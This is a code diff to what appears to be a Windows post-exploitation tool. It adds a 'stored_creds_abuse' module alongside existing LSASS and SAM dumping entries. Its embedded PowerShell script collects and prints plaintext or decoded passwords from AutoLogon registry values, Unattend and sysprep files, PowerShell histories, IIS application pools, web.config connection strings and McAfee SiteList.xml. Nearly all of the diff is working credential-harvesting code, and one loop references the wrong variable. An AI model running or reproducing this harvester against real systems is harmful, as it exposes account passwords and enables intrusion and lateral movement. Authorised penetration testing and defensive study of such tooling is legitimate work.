@@ -406,6 +406,10 @@ privilege_abuse: {
     description: "Enumerate and exploit dangerous Windows token privileges — SeBackupPrivilege (read any file including SAM/NTDS.dit via robocopy /b), SeRestorePrivilege (write anywhere, replace utilman.exe), SeTakeOwnershipPrivilege (take ownership of any object), SeLoadDriverPrivilege (load vulnerable kernel driver), SeDebugPrivilege (inject into any process), SeManageVolumePrivilege (raw disk read), SeAssignPrimaryTokenPrivilege (create process with another token), SeImpersonatePrivilege (token theft for SYSTEM)",
     args: "--action enum|exploit --privilege PRIVILEGE_NAME [--target PATH]",
   },
+stored_creds_abuse: {
+    description: "Enumerate stored credentials across the system — cmdkey saved credentials, AutoLogon registry (DefaultUserName/DefaultPassword), Unattend.xml/sysprep.xml base64 passwords, PowerShell ConsoleHost_history.txt, IIS application pool credentials, web.config connection strings, McAfee SiteList.xml, and Group Policy Preferences cpassword remnants",
+    args: "--action enum [--deep true]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -13961,6 +13965,214 @@ foreach ($d in $drivers) {
   return { output: output.join("\n"), findings }
 }
 
+async function storedCredsAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const deep = argVal(args, "--deep") === "true"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Stored credentials enumeration...\n"]
+
+  const script = `
+$found = 0
+
+# ── 1. cmdkey stored credentials ──
+Write-Output "=== Stored Credentials (cmdkey) ==="
+$cmdkeyOutput = cmdkey /list 2>&1
+if ($cmdkeyOutput -match 'Target:') {
+    Write-Output $cmdkeyOutput
+    $targets = ($cmdkeyOutput | Select-String 'Target:').Count
+    $found += $targets
+    Write-Output "[+] Found $targets stored credential(s)"
+} else {
+    Write-Output "[-] No stored credentials"
+}
+
+# ── 2. AutoLogon credentials ──
+Write-Output ""
+Write-Output "=== AutoLogon Credentials ==="
+$winlogon = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+$autoUser = (Get-ItemProperty $winlogon -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
+$autoPass = (Get-ItemProperty $winlogon -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
+$autoDomain = (Get-ItemProperty $winlogon -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
+$autoLogon = (Get-ItemProperty $winlogon -Name AutoAdminLogon -ErrorAction SilentlyContinue).AutoAdminLogon
+
+if ($autoPass) {
+    Write-Output "[+] AutoLogon ENABLED with password!"
+    Write-Output "    Domain:   $autoDomain"
+    Write-Output "    User:     $autoUser"
+    Write-Output "    Password: $autoPass"
+    Write-Output "    AutoAdmin: $autoLogon"
+    $found++
+} elseif ($autoUser) {
+    Write-Output "[*] AutoLogon user set but no password in registry: $autoDomain\\$autoUser"
+} else {
+    Write-Output "[-] No AutoLogon configured"
+}
+
+# Also check LSA secrets for AutoLogon
+$lsaAutoLogon = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name AutoLogonSID -ErrorAction SilentlyContinue).AutoLogonSID
+if ($lsaAutoLogon) { Write-Output "[*] AutoLogonSID present (password may be in LSA secrets)" }
+
+# ── 3. Unattend/Sysprep files ──
+Write-Output ""
+Write-Output "=== Unattend/Sysprep Files ==="
+$unattendPaths = @(
+    "$env:SystemRoot\\Panther\\Unattend.xml",
+    "$env:SystemRoot\\Panther\\unattend.xml",
+    "$env:SystemRoot\\Panther\\Unattended.xml",
+    "$env:SystemRoot\\System32\\Sysprep\\unattend.xml",
+    "$env:SystemRoot\\System32\\Sysprep\\Panther\\unattend.xml",
+    "$env:SystemRoot\\sysprep\\sysprep.xml",
+    "$env:SystemRoot\\sysprep.inf",
+    "$env:SystemDrive\\unattend.xml"
+)
+
+foreach ($path in $unattendPaths) {
+    if (Test-Path $path -ErrorAction SilentlyContinue) {
+        Write-Output "[+] Found: $path"
+        $content = Get-Content $path -Raw -ErrorAction SilentlyContinue
+        # Look for password elements
+        if ($content -match '<Password>[\s\S]*?<Value>([^<]+)</Value>') {
+            $passValue = $Matches[1]
+            # Try base64 decode
+            try {
+                $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($passValue))
+                Write-Output "    [!] Password (decoded): $decoded"
+            } catch {
+                Write-Output "    [!] Password (raw): $passValue"
+            }
+            $found++
+        }
+        if ($content -match '<AutoLogon>') { Write-Output "    [*] Contains AutoLogon configuration" }
+        if ($content -match '<AdministratorPassword>') { Write-Output "    [!] Contains AdministratorPassword" }
+    }
+}
+
+# ── 4. PowerShell history ──
+Write-Output ""
+Write-Output "=== PowerShell History ==="
+$historyPath = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+if (Test-Path $historyPath) {
+    $histContent = Get-Content $historyPath -ErrorAction SilentlyContinue
+    $sensitive = $histContent | Select-String -Pattern 'password|passwd|pwd|secret|token|apikey|credential|key|connectionstring' -AllMatches
+    if ($sensitive) {
+        Write-Output "[+] Sensitive entries in PS history ($($sensitive.Count) matches):"
+        $sensitive | Select-Object -First 20 | ForEach-Object { Write-Output "    $_" }
+        $found += $sensitive.Count
+    } else {
+        Write-Output "[-] No sensitive keywords in history"
+    }
+    Write-Output "    History file: $historyPath ($($histContent.Count) lines)"
+} else {
+    Write-Output "[-] No PowerShell history file"
+}
+
+# Also check other users' history if admin
+$otherHistories = Get-ChildItem "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+foreach ($h in $otherHistories) {
+    if ($h.FullName -ne $historyPath) {
+        Write-Output "    [*] Other user history: $($h.FullName) ($($h.Length) bytes)"
+    }
+}
+
+# ── 5. IIS Application Pool Credentials ──
+Write-Output ""
+Write-Output "=== IIS Application Pool Credentials ==="
+if (Get-Command appcmd -ErrorAction SilentlyContinue) {
+    $pools = appcmd list apppool /text:name 2>$null
+    foreach ($pool in $pools) {
+        $config = appcmd list apppool "$pool" /text:processModel.userName 2>$null
+        if ($config -and $config -ne '') {
+            $pass = appcmd list apppool "$pool" /text:processModel.password 2>$null
+            Write-Output "    [+] Pool: $pool — User: $config Password: $pass"
+            $found++
+        }
+    }
+} else {
+    # Try via registry/config files
+    $iisConfig = "$env:SystemRoot\\System32\\inetsrv\\config\\applicationHost.config"
+    if (Test-Path $iisConfig) {
+        $iisContent = Get-Content $iisConfig -Raw -ErrorAction SilentlyContinue
+        if ($iisContent -match 'password="([^"]+)"') {
+            Write-Output "    [+] Found password in applicationHost.config"
+            $found++
+        }
+    } else {
+        Write-Output "[-] IIS not installed"
+    }
+}
+
+# ── 6. Web.config and connection strings ──
+Write-Output ""
+Write-Output "=== Web.config / Connection Strings ==="
+$webConfigs = Get-ChildItem -Path "$env:SystemDrive\\inetpub", "$env:SystemDrive\\Sites", "$env:SystemDrive\\wwwroot" -Recurse -Filter "web.config" -ErrorAction SilentlyContinue | Select-Object -First 20
+foreach ($wc in $webConfigs) {
+    $wcContent = Get-Content $wc.FullName -Raw -ErrorAction SilentlyContinue
+    if ($wcContent -match 'connectionString.*(?:password|pwd)=([^;"]+)') {
+        Write-Output "    [+] $($wc.FullName): password in connection string"
+        $found++
+    }
+}
+if ($webConfigs.Count -eq 0) { Write-Output "[-] No web.config files found" }
+
+# ── 7. Scheduled tasks with stored credentials ──
+Write-Output ""
+Write-Output "=== Scheduled Tasks with Stored Credentials ==="
+$tasks = schtasks /query /fo csv /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
+$credTasks = $tasks | Where-Object { $_.'Run As User' -and $_.'Run As User' -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE|N/A|Disabled' } | Select-Object -First 15
+if ($credTasks) {
+    foreach ($t in $credTasks) {
+        Write-Output "    [*] $($_.'TaskName') — RunAs: $($_.'Run As User')"
+    }
+} else {
+    Write-Output "[-] No tasks with stored user credentials"
+}
+
+# ── 8. McAfee SiteList.xml ──
+Write-Output ""
+Write-Output "=== McAfee/Trellix SiteList.xml ==="
+$siteListPaths = @(
+    "$env:ALLUSERSPROFILE\\Application Data\\McAfee\\Common Framework\\SiteList.xml",
+    "$env:ALLUSERSPROFILE\\McAfee\\Agent\\DB\\SiteList.xml",
+    "C:\\Program Files\\McAfee\\Agent\\DB\\SiteList.xml",
+    "C:\\Program Files (x86)\\McAfee\\Common Framework\\SiteList.xml"
+)
+foreach ($sl in $siteListPaths) {
+    if (Test-Path $sl) {
+        Write-Output "    [+] Found: $sl"
+        $slContent = Get-Content $sl -Raw -ErrorAction SilentlyContinue
+        if ($slContent -match 'Password="([^"]+)"') {
+            Write-Output "    [!] Encrypted password found (use mcafee-sitelist-pwd-decryption to decrypt)"
+            $found++
+        }
+    }
+}
+
+Write-Output ""
+Write-Output "=== Summary ==="
+Write-Output "[+] Total credential findings: $found"
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  const totalMatch = result.stdout.match(/Total credential findings: (\d+)/)
+  const total = totalMatch ? parseInt(totalMatch[1]) : 0
+
+  if (total > 0) {
+    findings.push({
+      checkId: "WIN-PRIVESC-CRED-001",
+      provider: "windows",
+      severity: "high",
+      status: "ENUMERATED",
+      resource: "credentials://stored",
+      title: `${total} stored credential(s) found across system`,
+      details: result.stdout.substring(0, 500),
+      remediation: "Remove stored credentials with cmdkey /delete. Disable AutoLogon. Delete unattend files. Clear PowerShell history. Rotate exposed passwords.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -14043,6 +14255,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   remote_monologue: remoteMonologue,
   nanodump_advanced: nanodumpAdvanced,
   privilege_abuse: privilegeAbuse,
+  stored_creds_abuse: storedCredsAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
